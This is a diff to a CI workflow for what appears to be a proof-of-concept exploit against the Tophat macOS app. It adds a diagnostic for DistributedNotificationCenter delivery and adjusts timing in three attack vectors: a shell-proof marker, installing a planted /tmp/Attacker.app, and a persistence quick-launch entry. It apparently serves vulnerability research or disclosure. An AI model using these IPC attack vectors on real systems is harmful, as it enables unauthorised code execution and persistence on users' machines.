@@ -131,6 +131,41 @@ jobs:
           # uninstall so the IPC-driven install proves it re-installs via Tophat
           xcrun simctl uninstall "$SIM_UDID" com.attacker.tophat.poc || true
 
+      - name: DIAGNOSTIC - test if DistributedNotificationCenter even delivers on this runner
+        run: |
+          set -eux
+          cat > diag.swift <<'SWIFT'
+          import Foundation
+          let expect = expectation(name: "recv")
+          class Recv: NSObject {
+              var received = false
+              @objc func handle(_ note: Notification) {
+                  received = true
+                  print("[diag] RECEIVED userInfo=\(note.userInfo ?? [:])")
+              }
+          }
+          func expectation(name: String) -> Recv { Recv() }
+          let recv = Recv()
+          DistributedNotificationCenter.default().addObserver(
+              recv, selector: #selector(Recv.handle(_:)),
+              name: Notification.Name("com.tophat.diagnostic.selftest"),
+              object: nil
+          )
+          DispatchQueue.global().asyncAfter(deadline: .now() + 1) {
+              DistributedNotificationCenter.default().postNotificationName(
+                  Notification.Name("com.tophat.diagnostic.selftest"),
+                  object: nil,
+                  userInfo: ["hello": "world"],
+                  deliverImmediately: true
+              )
+              print("[diag] posted")
+          }
+          RunLoop.main.run(until: Date().addingTimeInterval(5))
+          print("[diag] final received=\(recv.received)")
+          exit(recv.received ? 0 : 1)
+          SWIFT
+          swift diag.swift || echo "DIAGNOSTIC: DistributedNotificationCenter delivery FAILED on this runner"
+
       - name: Launch Tophat.app in background and wait for InstallCoordinator to idle
         run: |
           set -eux
@@ -181,13 +216,13 @@ jobs:
                   deliverImmediately: true
               )
               print("[vector1 iter=\(i)] posted id=\(uuid)")
-              Thread.sleep(forTimeInterval: 6)
+              RunLoop.main.run(until: Date().addingTimeInterval(6))
               if FileManager.default.fileExists(atPath: "/tmp/tophat_shell_proof.txt") {
                   print("[vector1] marker present after iter=\(i)")
                   break
               }
           }
-          Thread.sleep(forTimeInterval: 5)
+          RunLoop.main.run(until: Date().addingTimeInterval(5))
           SWIFT
           swift post_shell.swift
 
@@ -211,7 +246,7 @@ jobs:
                   deliverImmediately: true
               )
               print("[vector2 iter=\(i)] posted id=\(uuid) url=file:///tmp/Attacker.app")
-              Thread.sleep(forTimeInterval: 15)
+              RunLoop.main.run(until: Date().addingTimeInterval(15))
           }
           SWIFT
           swift post_url.swift
@@ -243,7 +278,7 @@ jobs:
               deliverImmediately: true
           )
           print("[vector3] posted Tophat.AddQuickLaunchEntryRequest")
-          Thread.sleep(forTimeInterval: 5)
+          RunLoop.main.run(until: Date().addingTimeInterval(5))
           SWIFT
           swift post_persist.swift
 
